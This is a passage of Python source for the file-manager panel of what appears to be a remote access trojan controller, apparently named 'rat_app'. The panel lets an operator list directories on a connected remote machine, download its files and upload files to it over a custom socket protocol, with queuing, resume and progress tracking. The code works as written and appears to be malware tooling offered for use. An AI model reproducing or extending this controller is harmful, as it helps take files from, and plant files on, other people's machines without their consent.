            if conn == self.rat_app.current_client_socket:
                self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                break
        
        # Check if we should queue or start directly
        if self.queue_var.get():
            self.add_to_upload_queue(self.selected_files, dest_path)
        else:
            # If multiple files, start first file and queue the rest
            if len(self.selected_files) > 1:
                first_file = self.selected_files[0]
                self.selected_files = self.selected_files[1:]
                
                # Queue remaining files
                if self.selected_files:
                    self.add_to_upload_queue(self.selected_files, dest_path)
                    
                # Start upload of first file
                self.update_ui_for_transfer(True)
                self.stop_transfer = False
                threading.Thread(target=self.upload_file_thread, args=(first_file, dest_path), daemon=True).start()
            else:
                # Single file upload
                self.update_ui_for_transfer(True)
                self.stop_transfer = False
                threading.Thread(target=self.upload_file_thread, args=(self.selected_files[0], dest_path), daemon=True).start()
    
    def add_to_upload_queue(self, file_paths, dest_path):
        """Add files to the upload queue."""
        if not hasattr(self, 'queue_items'):
            self.queue_items = []
            
        # Get current priority setting
        priority = self.priority_var.get() if hasattr(self, 'priority_var') else "Normal"
        
        # Add each file to queue
        for file_path in file_paths:
            try:
                file_name = os.path.basename(file_path)
                file_size = os.path.getsize(file_path)
                
                # Full destination path
                full_dest_path = os.path.join(dest_path, file_name)
                
                # Add to queue
                queue_item = {
                    'type': 'Upload',
                    'source': file_path,
                    'destination': full_dest_path,
                    'size': self.format_size(file_size),
                    'priority': priority,
                    'status': 'Pending',
                    'added_time': time.time()
                }
                
                self.queue_items.append(queue_item)
            except Exception as e:
                self.rat_app.log(f"Error adding to upload queue: {e}")
        
        # Update queue display
        self.update_queue_display()
        
        # Show feedback
        count = len(file_paths)
        self.rat_app.log(f"Added {count} files to upload queue")
        
        # Show a notification
        self.show_toast_notification(f"Added {count} files to upload queue")
    
    def upload_file_thread(self, file_path, dest_path):
        """Upload a file with improved progress tracking and error handling."""
        
        if not hasattr(self, 'is_paused'):
            self.is_paused = False
        try:
            # First, validate that the file still exists
            if not os.path.exists(file_path):
                self.rat_app.log(f"Error: Source file no longer exists: {file_path}")
                self.file_frame.after(0, lambda: self.status_value.configure(text="Error: Source file missing"))
                self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                return
                
            # Record start time for performance metrics
            start_time = time.time()
                
            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)
            
            # Generate a unique transfer ID
            transfer_id = f"UP_{file_name}_{int(start_time)}"
            
            # Create current transfer record
            self.current_transfer = {
                'type': 'Upload',
                'source': file_path,
                'destination': os.path.join(dest_path, file_name),
                'size': self.format_size(file_size),
                'status': 'In Progress',
                'start_time': start_time
            }
            
            # Ensure destination ends with a separator
            if not dest_path.endswith('\\') and not dest_path.endswith('/'):
                dest_path += '\\'
            
            full_dest_path = dest_path + file_name
            
            # Check if we have an existing transfer state
            resume_position = 0
            if transfer_id in self.transfer_states:
                resume_position = self.transfer_states[transfer_id]['position']
                self.rat_app.log(f"Resuming upload from position {resume_position}/{file_size}")
            
            # Update UI to show file being uploaded
            self.file_frame.after(0, lambda: self.status_value.configure(text=f"Uploading: {file_name}"))
            
            # Determine if we should overwrite
            overwrite = self.overwrite_var.get() if hasattr(self, 'overwrite_var') else True
            
            # Send command to start/resume file transfer with verbose logging
            command = f"FILE_UPLOAD|{full_dest_path}|{file_size}|{resume_position}|{transfer_id}|{overwrite}"
            self.rat_app.log(f"Sending command: {command}")
            self.rat_app.current_client_socket.send(command.encode())
            
            # Wait for acknowledgment with timeout
            self.rat_app.current_client_socket.settimeout(10)  # 10 second timeout
            try:
                response = self.rat_app.current_client_socket.recv(1024).decode()
                self.rat_app.log(f"Received response: {response}")
                
                if response != "READY":
                    self.rat_app.log(f"Upload failed: {response}")
                    self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {response}"))
                    self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                    return
            except socket.timeout:
                self.rat_app.log("Timeout waiting for READY response")
                self.file_frame.after(0, lambda: self.status_value.configure(text="Error: Connection timeout"))
                self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                return
            finally:
                self.rat_app.current_client_socket.settimeout(None)  # Remove timeout
            
            # Send file data from the resume position
            with open(file_path, 'rb') as f:
                try:
                    f.seek(resume_position)
                    self.rat_app.log(f"Seeking to position {resume_position} in file")
                except Exception as e:
                    self.rat_app.log(f"Error seeking to position {resume_position}: {e}")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Error: Cannot resume from position"))
                    self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                    return
                    
                bytes_sent = resume_position
                
                # Update transfer state
                self.transfer_states[transfer_id] = {
                    'type': 'upload',
                    'file_path': file_path,
                    'dest_path': full_dest_path,
                    'total_size': file_size,
                    'position': bytes_sent,
                    'start_time': start_time
                }
                
                # Save state immediately after updating
                self.save_transfer_states()
                
                # Use a more reliable chunking approach
                chunk_size = self.CHUNK_SIZE
                last_save_time = time.time()
                last_update_time = time.time()
                
                while bytes_sent < file_size and not self.stop_transfer and not self.is_paused:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    
                    try:
                        self.rat_app.current_client_socket.send(chunk)
                        bytes_sent += len(chunk)
                        
                        # Update progress (limit updates to avoid UI freezing)
                        current_time = time.time()
                        if current_time - last_update_time > 0.1:  # Update every 100ms
                            self.file_frame.after(0, lambda b=bytes_sent, t=file_size, s=start_time: 
                                            self.update_progress(b, t, s))
                            last_update_time = current_time
                        
                        # Update transfer state (periodically to avoid excessive writes)
                        if current_time - last_save_time > 2:  # Save every 2 seconds
                            self.transfer_states[transfer_id]['position'] = bytes_sent
                            self.save_transfer_states()
                            last_save_time = current_time
                        
                        # Handle pause
                        while self.is_paused and not self.stop_transfer:
                            if hasattr(self, 'is_paused') and self.is_paused:
                                time.sleep(0.5)  # Sleep briefly while paused
                                continue  # Skip to next iteration
                        
                        # Wait for acknowledgment to ensure flow control
                        self.rat_app.current_client_socket.settimeout(10)
                        try:
                            ack = self.rat_app.current_client_socket.recv(1024).decode()
                            if ack != "ACK":
                                self.rat_app.log(f"Unexpected acknowledgment: {ack}")
                                raise Exception("Transfer interrupted")
                        except socket.timeout:
                            self.rat_app.log("Timeout waiting for ACK")
                            raise Exception("Connection timeout")
                        finally:
                            self.rat_app.current_client_socket.settimeout(None)
                            
                    except Exception as e:
                        self.rat_app.log(f"Error sending chunk: {e}")
                        # Update state before propagating the exception
                        self.transfer_states[transfer_id]['position'] = bytes_sent
                        self.save_transfer_states()
                        raise
            
            # Final update to transfer state
            self.transfer_states[transfer_id]['position'] = bytes_sent
            self.save_transfer_states()
            
            # Final update to progress UI
            self.file_frame.after(0, lambda b=bytes_sent, t=file_size, s=start_time: 
                            self.update_progress(b, t, s))
            
            if self.stop_transfer:
                self.rat_app.current_client_socket.send(b"CANCEL")
                self.rat_app.log("File upload cancelled but can be resumed later")
                self.file_frame.after(0, lambda: self.status_value.configure(text="Cancelled (Resumable)"))
                
                # Update history with cancellation
                self.current_transfer['status'] = "Cancelled"
                self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                self.add_to_history(self.current_transfer, "Cancelled")
            else:
                # Get final confirmation
                try:
                    self.rat_app.current_client_socket.settimeout(10)
                    final_response = self.rat_app.current_client_socket.recv(1024).decode()
                    self.rat_app.log(f"Final response: {final_response}")
                    
                    if final_response == "SUCCESS":
                        elapsed_time = time.time() - start_time
                        self.rat_app.log(f"File uploaded successfully to {full_dest_path}")
                        self.file_frame.after(0, lambda: self.status_value.configure(text="Upload Complete"))
                        
                        # Update history with success
                        self.current_transfer['status'] = "Complete"
                        self.current_transfer['duration'] = f"{int(elapsed_time)}s"
                        self.add_to_history(self.current_transfer, "Complete")
                        
                        # Clear transfer state on success
                        if transfer_id in self.transfer_states:
                            del self.transfer_states[transfer_id]
                            self.save_transfer_states()
                        
                        # Show success notification
                        self.file_frame.after(0, lambda: self.show_toast_notification(
                            f"Upload Complete: {file_name}"))
                    else:
                        self.rat_app.log(f"Upload failed: {final_response}")
                        self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {final_response}"))
                        
                        # Update history with failure
                        self.current_transfer['status'] = "Failed"
                        self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                        self.add_to_history(self.current_transfer, "Failed")
                except socket.timeout:
                    self.rat_app.log("Timeout waiting for final confirmation")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Warning: No final confirmation"))
                finally:
                    self.rat_app.current_client_socket.settimeout(None)
        
        except Exception as e:
            self.rat_app.log(f"Upload error: {e}")
            self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {str(e)}"))
            
            # Update history with error
            if hasattr(self, 'current_transfer'):
                self.current_transfer['status'] = "Failed"
                self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                self.add_to_history(self.current_transfer, "Failed")
        
        finally:
            # Ensure we restore UI state
            self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
            
            # Reset current transfer
            self.current_transfer = None
            
            # Process next item in queue if available
            if hasattr(self, 'queue_items') and self.queue_items:
                # Ask if user wants to continue with queue
                self.file_frame.after(0, lambda: self.ask_process_queue())
                    
    def ask_process_queue(self):
        """Ask user if they want to process the next queue item."""
        if not hasattr(self, 'queue_items') or not self.queue_items:
            return
            
        queue_count = len(self.queue_items)
        response = messagebox.askyesno("Continue Queue Processing", 
                                     f"Process next item? ({queue_count} remaining in queue)")
        if response:
            # Process next item
            next_item = self.queue_items[0]
            self.queue_items.pop(0)
            self.update_queue_display()
            
            if next_item['type'] == 'Upload':
                self.update_ui_for_transfer(True)
                self.stop_transfer = False
                threading.Thread(target=self.upload_file_thread, 
                               args=(next_item['source'], os.path.dirname(next_item['destination'])), 
                               daemon=True).start()
            elif next_item['type'] == 'Download':
                self.update_ui_for_transfer(True)
                self.stop_transfer = False
                threading.Thread(target=self.download_file_thread, 
                               args=(next_item['source'], os.path.dirname(next_item['destination'])), 
                               daemon=True).start()

    def list_remote_files(self):
        """List files from the remote system with enhanced display and sorting."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "No client connected")
            return
        
        remote_path = self.remote_path_entry.get()
        if not remote_path:
            messagebox.showinfo("No Path", "Enter a remote path to list files")
            return
        
        # Update client info label
        for addr, (client_id, conn) in self.rat_app.clients.items():
            if conn == self.rat_app.current_client_socket:
                self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                self.connection_status.configure(text="", text_color="#00AA00")
                break
        
        # Show loading indicator
        if hasattr(self, 'files_tree'):
            # Clear existing items
            for item in self.files_tree.get_children():
                self.files_tree.delete(item)
                
            # Add loading indicator
            self.files_tree.insert("", "end", values=("Loading...", "", "", ""))
            
        # Update status
        self.status_value.configure(text=f"Listing: {remote_path}")
        
        # Start file listing in a thread
        threading.Thread(target=self.list_remote_files_thread, args=(remote_path,), daemon=True).start()
    
    def list_remote_files_thread(self, remote_path):
        """Thread function to list remote files with enhanced error handling."""
        try:
            # Send command to list files
            command = f"FILE_LIST|{remote_path}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Set timeout for response
            self.rat_app.current_client_socket.settimeout(30)  # 30 second timeout for large directories
            
            try:
                # Get response size
                size_data = self.rat_app.current_client_socket.recv(8)
                
                # Check if this is an error message
                if size_data.startswith(b"ERROR"):
                    error_msg = size_data + self.rat_app.current_client_socket.recv(1024)
                    self.rat_app.log(f"List files error: {error_msg.decode('utf-8', errors='replace')}")
                    self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", error_msg.decode('utf-8', errors='replace')))
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
                    return
                
                response_size = struct.unpack('Q', size_data)[0]
                
                # Receive file listing data
                data = b""
                while len(data) < response_size:
                    chunk_size = min(response_size - len(data), self.CHUNK_SIZE)
                    chunk = self.rat_app.current_client_socket.recv(chunk_size)
                    if not chunk:
                        break
                    data += chunk
                
                # Reset timeout
                self.rat_app.current_client_socket.settimeout(None)
                
                file_list = data.decode('utf-8', errors='replace')
                
                # Check for error
                if file_list.startswith("ERROR:"):
                    self.rat_app.log(file_list)
                    self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", file_list))
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
                    return
                
                # Clear existing items
                self.file_frame.after(0, lambda: self.clear_file_tree())
                
                # Parse and prepare files for display
                files = []
                directories = []
                
                file_entries = file_list.split('\n')
                for file_info in file_entries:
                    if not file_info.strip():
                        continue
                        
                    parts = file_info.split('|')
                    if len(parts) >= 4:
                        name, size, file_type, modified = parts[:4]
                        
                        # Skip hidden files unless show_hidden is enabled
                        if not self.show_hidden_files and name.startswith('.'):
                            continue
                            
                        # Separate directories and files
                        if file_type.lower() == "folder" or file_type.lower() == "directory":
                            directories.append((name, size, file_type, modified))
                        else:
                            files.append((name, size, file_type, modified))
                
                # Store original data for filtering
                self.original_file_data = directories + files
                
                # Display the files in the UI thread
                self.file_frame.after(0, lambda d=directories, f=files: self.display_remote_files(d, f))
            
            except socket.timeout:
                self.rat_app.log("Timeout while listing files")
                self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", "Timeout while listing files"))
                self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
                
            except struct.error:
                self.rat_app.log("Invalid size data received")
                self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", "Invalid data format"))
                self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
                
        except Exception as e:
            self.rat_app.log(f"Error listing files: {e}")
            self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", f"Error: {e}"))
            self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
        finally:
            # Reset timeout
            try:
                self.rat_app.current_client_socket.settimeout(None)
            except:
                pass
    
    def clear_file_tree(self):
        """Clear the file tree."""
        if hasattr(self, 'files_tree'):
            for item in self.files_tree.get_children():
                self.files_tree.delete(item)
    
    def display_remote_files(self, directories, files):
        """Display remote files and directories in the treeview."""
        try:
            # Apply current filter if any
            filter_text = ""
            if hasattr(self, 'filter_entry'):
                filter_text = self.filter_entry.get().lower()
            
            # Display directories first
            for dir_info in directories:
                name, size, file_type, modified = dir_info
                
                # Apply filter if set
                if filter_text and filter_text not in name.lower():
                    continue
                    
                self.files_tree.insert("", "end", values=(name, size, file_type, modified))
            
            # Then display files
            for file_info in files:
                name, size, file_type, modified = file_info
                
                # Apply filter if set
                if filter_text and filter_text not in name.lower():
                    continue
                    
                self.files_tree.insert("", "end", values=(name, size, file_type, modified))
            
            # Update file count
            total_items = len(self.files_tree.get_children())
            if hasattr(self, 'file_count_label'):
                self.file_count_label.configure(text=f"{total_items} {'item' if total_items == 1 else 'items'}")
            
            # Update status
            self.status_value.configure(text="Idle")
            
            # Apply current sort if any
            if hasattr(self, 'current_sort_column'):
                self.sort_treeview(self.files_tree, self.current_sort_column)
                
        except Exception as e:
            self.rat_app.log(f"Error displaying files: {e}")
    
    def select_remote_file(self, event):
        """Handle double-click on remote file."""
        selection = self.files_tree.selection()
        if not selection:
            return
            
        item = self.files_tree.item(selection[0])
        values = item["values"]
        
        # Get the file name and type
        file_name = values[0]
        file_type = values[2] if len(values) > 2 else ""
        
        # If it's a directory, navigate into it
        if file_type.lower() == "folder" or file_type.lower() == "directory":
            current_path = self.remote_path_entry.get()
            
            # Ensure path ends with separator
            if not current_path.endswith('\\') and not current_path.endswith('/'):
                if '\\' in current_path:
                    current_path += '\\'
                else:
                    current_path += '/'
                    
            # Navigate to the directory
            new_path = current_path + file_name
            self.remote_path_entry.delete(0, tk.END)
            self.remote_path_entry.insert(0, new_path)
            
            # List files in the new directory
            self.list_remote_files()
        else:
            # File selected, prepare for download
            current_path = self.remote_path_entry.get()
            
            # Ensure path ends with separator
            if not current_path.endswith('\\') and not current_path.endswith('/'):
                if '\\' in current_path:
                    current_path += '\\'
                else:
                    current_path += '/'
                    
            # Update remote path entry with full file path
            full_path = current_path + file_name
            self.remote_path_entry.delete(0, tk.END)
            self.remote_path_entry.insert(0, full_path)
    
    # File download functionality with improved progress tracking and error handling
    def download_file(self):
        """Download selected file(s) from remote system."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "No client connected")
            return
        
        # Get selected items
        selection = self.files_tree.selection()
        if not selection:
            # If no selection but a path is in the entry, use that
            remote_file = self.remote_path_entry.get()
            if not remote_file:
                messagebox.showinfo("No Selection", "Select a file to download")
                return
                
            # Check if the path looks like a file (not ending with / or \)
            if remote_file.endswith('/') or remote_file.endswith('\\'):
                messagebox.showinfo("Not a File", "Select a file to download")
                return
        else:
            # Get the selected file(s)
            files_to_download = []
            
            for item_id in selection:
                item = self.files_tree.item(item_id)
                values = item["values"]
                
                file_name = values[0]
                file_type = values[2] if len(values) > 2 else ""
                
                # Skip directories for now
                if file_type.lower() == "folder" or file_type.lower() == "directory":
                    continue
                    
                # Get current path
                current_path = self.remote_path_entry.get()
                
                # Ensure path ends with separator
                if not current_path.endswith('\\') and not current_path.endswith('/'):
                    if '\\' in current_path:
                        current_path += '\\'
                    else:
                        current_path += '/'
                        
                # Add to download list
                files_to_download.append(current_path + file_name)
            
            if not files_to_download:
                messagebox.showinfo("No Files", "No files selected for download")
                return
                
            # Set the remote file to the first one
            remote_file = files_to_download[0]
            
            # Queue the rest if there are more
            if len(files_to_download) > 1:
                self.queue_additional_downloads(files_to_download[1:])
        
        # Get destination directory
        local_dest = self.download_dest_entry.get()
        if not local_dest:
            local_dest = filedialog.askdirectory(title="Select Download Destination")
            if not local_dest:
                return
                
            self.download_dest_entry.delete(0, tk.END)
            self.download_dest_entry.insert(0, local_dest)
        
        # Update client info label
        for addr, (client_id, conn) in self.rat_app.clients.items():
            if conn == self.rat_app.current_client_socket:
                self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                break
        
        # Start download
        self.update_ui_for_transfer(True)
        self.stop_transfer = False
        threading.Thread(target=self.download_file_thread, args=(remote_file, local_dest), daemon=True).start()
    
    def queue_additional_downloads(self, file_paths):
        """Add additional files to the download queue."""
        if not hasattr(self, 'queue_items'):
            self.queue_items = []
            
        # Get destination directory
        local_dest = self.download_dest_entry.get()
        if not local_dest:
            return
            
        # Get current priority setting
        priority = self.priority_var.get() if hasattr(self, 'priority_var') else "Normal"
        
        # Add each file to queue
        for file_path in file_paths:
            file_name = os.path.basename(file_path)
            
            # Add to queue
            queue_item = {
                'type': 'Download',
                'source': file_path,
                'destination': os.path.join(local_dest, file_name),
                'size': "Unknown",  # Size will be determined during download
                'priority': priority,
                'status': 'Pending',
                'added_time': time.time()
            }
            
            self.queue_items.append(queue_item)
        
        # Update queue display
        self.update_queue_display()
        
        # Show feedback
        count = len(file_paths)
        self.rat_app.log(f"Added {count} files to download queue")
        
        # Notify user
        self.show_toast_notification(f"Added {count} files to download queue")
    
    def download_file_thread(self, remote_file, local_dest):
        """Thread function to download a file with progress tracking."""
        
        if not hasattr(self, 'is_paused'):
            self.is_paused = False
            
        try:
            # Record start time for performance metrics
            start_time = time.time()
            
            # Get file name from path
            file_name = os.path.basename(remote_file)
            
            # Generate a unique transfer ID
            transfer_id = f"DN_{int(start_time)}_{file_name}"
            
            # Create current transfer record
            self.current_transfer = {
                'type': 'Download',
                'source': remote_file,
                'destination': os.path.join(local_dest, file_name),
                'size': "Unknown",  # Will be updated once we know
                'status': 'In Progress',
                'start_time': start_time
            }
            
            # Ensure destination is a directory
            if not os.path.isdir(local_dest):
                try:
                    os.makedirs(local_dest)
                except Exception as e:
                    self.rat_app.log(f"Could not create directory: {local_dest}")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Error: Invalid destination"))
                    self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                    return
            
            # Ensure destination ends with a separator
            if not local_dest.endswith('\\') and not local_dest.endswith('/'):
                if os.name == 'nt':  # Windows
                    local_dest += '\\'
                else:
                    local_dest += '/'
                    
            local_file_path = local_dest + file_name
            
            # Check if file exists for resume
            resume_position = 0
            if os.path.exists(local_file_path) and transfer_id in self.transfer_states:
                resume_position = os.path.getsize(local_file_path)
                self.rat_app.log(f"Resuming download from position {resume_position}")
            
            # Update UI to show file being downloaded
            self.file_frame.after(0, lambda: self.status_value.configure(text=f"Downloading: {file_name}"))
            
            # Send command to start/resume file download
            command = f"FILE_DOWNLOAD|{remote_file}|{resume_position}|{transfer_id}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Get file size
            size_data = self.rat_app.current_client_socket.recv(8)
            if size_data == b"ERROR":
                error_msg = self.rat_app.current_client_socket.recv(1024).decode()
                self.rat_app.log(f"Download failed: {error_msg}")
                self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {error_msg}"))
                self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                
                # Update history with failure
                self.current_transfer['status'] = "Failed"
                self.current_transfer['duration'] = "0s"
                self.add_to_history(self.current_transfer, "Failed")
                return
                
            file_size = struct.unpack('Q', size_data)[0]
            
            # Update transfer info with size
            self.current_transfer['size'] = self.format_size(file_size)
            
            # Ready to receive
            self.rat_app.current_client_socket.send(b"READY")
            
            # Update transfer state
            self.transfer_states[transfer_id] = {
                'type': 'download',
                'remote_file': remote_file,
                'local_file': local_file_path,
                'total_size': file_size,
                'position': resume_position,
                'start_time': start_time
            }
            
            # Save state immediately
            self.save_transfer_states()
            
            # Receive and save file
            with open(local_file_path, 'ab' if resume_position > 0 else 'wb') as f:
                bytes_received = resume_position
                self.file_frame.after(0, lambda: self.status_value.configure(text="Downloading..."))
                
                # For progress updates
                last_update_time = time.time()
                last_save_time = time.time()
                
                while bytes_received < file_size and not self.stop_transfer and not self.is_paused:
                    # Calculate remaining bytes and chunk size
                    remaining = file_size - bytes_received
                    chunk_size = min(remaining, self.CHUNK_SIZE)
                    
                    # Set timeout for receive operation
                    self.rat_app.current_client_socket.settimeout(30)  # 30 second timeout
                    
                    try:
                        chunk = self.rat_app.current_client_socket.recv(chunk_size)
                        self.rat_app.current_client_socket.settimeout(None)  # Reset timeout
                        
                        if not chunk:
                            self.rat_app.log("No data received, connection may be closed")
                            break
                            
                        if chunk == b"CANCEL":
                            self.rat_app.log("Download cancelled by client")
                            break
                        
                        f.write(chunk)
                        bytes_received += len(chunk)
                        
                        # Update progress (limit updates to avoid UI freezing)
                        current_time = time.time()
                        if current_time - last_update_time > 0.1:  # Update every 100ms
                            self.file_frame.after(0, lambda b=bytes_received, t=file_size, s=start_time: 
                                            self.update_progress(b, t, s))
                            last_update_time = current_time
                        
                        # Update transfer state periodically
                        if current_time - last_save_time > 2:  # Save every 2 seconds
                            self.transfer_states[transfer_id]['position'] = bytes_received
                            self.save_transfer_states()
                            last_save_time = current_time
                        
                        # Handle pause
                        # while bytes_received < file_size and not self.stop_transfer:
                        #         # Handle pause if implemented
                        #         if hasattr(self, 'is_paused') and self.is_paused:
                        #             time.sleep(0.5)  # Sleep briefly while paused
                        #             continue  # Skip to next iteration
                        
                        # Send acknowledgment for flow control
                        
                        self.rat_app.current_client_socket.send(b"ACK")
                        
                    except socket.timeout:
                        self.rat_app.log("Timeout while receiving data")
                        # Update transfer state for potential resume
                        self.transfer_states[transfer_id]['position'] = bytes_received
                        self.save_transfer_states()
                        raise Exception("Connection timeout during download")
                        
                    except Exception as e:
                        self.rat_app.log(f"Error receiving data: {e}")
                        # Update transfer state for potential resume
                        self.transfer_states[transfer_id]['position'] = bytes_received
                        self.save_transfer_states()
                        raise
                
                # Final update to transfer state
                self.transfer_states[transfer_id]['position'] = bytes_received
                self.save_transfer_states()
                
                # Final update to progress UI
                self.file_frame.after(0, lambda b=bytes_received, t=file_size, s=start_time: 
                                self.update_progress(b, t, s))
                
                if self.stop_transfer:
                    self.rat_app.current_client_socket.send(b"CANCEL")
                    self.rat_app.log("File download cancelled but can be resumed later")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Cancelled (Resumable)"))
                    
                    # Update history with cancellation
                    self.current_transfer['status'] = "Cancelled"
                    self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                    self.add_to_history(self.current_transfer, "Cancelled")
                else:
                    elapsed_time = time.time() - start_time
                    # Send success confirmation to client
                    self.rat_app.current_client_socket.send(b"SUCCESS")
                    self.rat_app.log(f"File downloaded successfully to {local_file_path}")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Download Complete"))
                    
                    # Update history with success
                    self.current_transfer['status'] = "Complete"
                    self.current_transfer['duration'] = f"{int(elapsed_time)}s"
                    self.add_to_history(self.current_transfer, "Complete")
                    
                    # Clear transfer state on success
                    if transfer_id in self.transfer_states:
                        del self.transfer_states[transfer_id]
                        self.save_transfer_states()
                    
                    # Show success notification
                    self.file_frame.after(0, lambda: self.show_toast_notification(
                        f"Download Complete: {file_name}"))
            
        except Exception as e:
            self.rat_app.log(f"Download error: {e}")
            self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {str(e)}"))
            
            # Update history with error
            if hasattr(self, 'current_transfer'):
                self.current_transfer['status'] = "Failed"
                self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                self.add_to_history(self.current_transfer, "Failed")
        
        finally:
            # Ensure timeout is reset
            try:
                self.rat_app.current_client_socket.settimeout(None)
            except:
                pass
                
            # Ensure we restore UI state
            self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
            
            # Reset current transfer
            self.current_transfer = None
            
            # Process next item in queue if available
            if hasattr(self, 'queue_items') and self.queue_items:
                # Ask if user wants to continue with queue
                self.file_frame.after(0, lambda: self.ask_process_queue())
    
    def show_resume_dialog(self):
        """Show a dialog to select which transfer to resume."""
        resumable = self.get_resumable_transfers()
        
        if not resumable:
            messagebox.showinfo("No Transfers", "No resumable transfers available")
            return
            
        # Create dialog
        theme = self.get_theme_colors()
        dialog = ctk.CTkToplevel(self.file_frame)
        dialog.title("Resume Transfer")
        dialog.geometry("500x300")
        dialog.grab_set()
        
        # Create list frame with modern styling
        list_frame = ctk.CTkFrame(dialog, fg_color=theme["card_color"],
                              corner_radius=10)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title with icon
        title_label = ctk.CTkLabel(list_frame, text=" Resume Interrupted Transfer", 
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                              size=FONT_STYLES["subheading"][1], 
                                              weight=FONT_STYLES["subheading"][2]))
        title_label.pack(anchor="w", padx=15, pady=(10, 15))
        
        # Create styled listbox for transfers
        list_container = ctk.CTkFrame(list_frame, fg_color=theme["bg_color"])
        list_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        listbox = tk.Listbox(list_container, bg=theme["bg_color"], fg=theme["fg_color"], 
                         selectbackground=theme["accent_color"], height=10,
                         font=ctk.CTkFont(size=12))
        listbox.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Add scrollbar
        scrollbar = tk.Scrollbar(listbox, orient="vertical", command=listbox.yview)
        listbox.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Add transfers to listbox with detailed info
        for i, transfer in enumerate(resumable):
            display_text = f"{transfer['type'].upper()}: {transfer['file']} - {transfer['progress']} completed"
            listbox.insert(tk.END, display_text)
        
        # Info section
        info_text = ctk.CTkLabel(list_frame, text="Select a transfer to resume. Progress will continue from where it was interrupted.",
                             font=ctk.CTkFont(size=11),
                             text_color=theme["fg_color"])
        info_text.pack(pady=(0, 10), padx=15)
        
        # Select first item
        if resumable:
            listbox.selection_set(0)
        
        # Create buttons with modern styling
        button_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        resume_btn = ctk.CTkButton(button_frame, text="Resume Selected", 
                               command=lambda: self.resume_selected_transfer(
                                   resumable[listbox.curselection()[0]] if listbox.curselection() else None, 
                                   dialog),
                               fg_color=theme["accent_color"],
                               hover_color=theme["hover_color"],
                               height=36,
                               corner_radius=8)
        resume_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        cancel_btn = ctk.CTkButton(button_frame, text="Cancel", 
                               command=dialog.destroy,
                               fg_color=theme["button_color"],
                               hover_color=theme["hover_color"],
                               height=36,
                               corner_radius=8)
        cancel_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
    
    def resume_selected_transfer(self, transfer_info, dialog):
        """Resume the selected transfer and close the dialog."""
        dialog.destroy()
        
        if not transfer_info:
            return
            
        transfer_id = transfer_info['id']
        state = self.transfer_states[transfer_id]
        
        # Resume based on transfer type
        if state['type'] == 'upload':
            self.update_ui_for_transfer(True)
            self.stop_transfer = False
            self.is_paused = False
            threading.Thread(
                target=self.upload_file_thread, 
                args=(state['file_path'], os.path.dirname(state['dest_path'])),
                daemon=True
            ).start()
        else:  # download
            self.update_ui_for_transfer(True)
            self.stop_transfer = False
            self.is_paused = False
            threading.Thread(
                target=self.download_file_thread, 
                args=(state['remote_file'], os.path.dirname(state['local_file'])),
                daemon=True
            ).start()
    
    def get_resumable_transfers(self):
        """Get a list of resumable transfers with readable info."""
        resumable = []
        
        if not hasattr(self, 'transfer_states'):
            return resumable
            
        for transfer_id, state in self.transfer_states.items():
            valid, reason = self.validate_transfer_state(transfer_id)
            if valid:
                # Extract file name
                if state['type'] == 'upload':
                    file_name = os.path.basename(state['file_path'])
                else:
                    file_name = os.path.basename(state['remote_file'])
                    
                # Calculate progress
                progress = (state['position'] / state['total_size']) * 100
                
                resumable.append({
                    'id': transfer_id,
                    'type': state['type'],
                    'file': file_name,
                    'progress': f"{progress:.1f}%",
                    'time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(state['start_time']))
                })
        
        return resumable
    
    def validate_transfer_state(self, transfer_id):
        """Validate that a transfer state is valid and can be resumed."""
        if not hasattr(self, 'transfer_states') or transfer_id not in self.transfer_states:
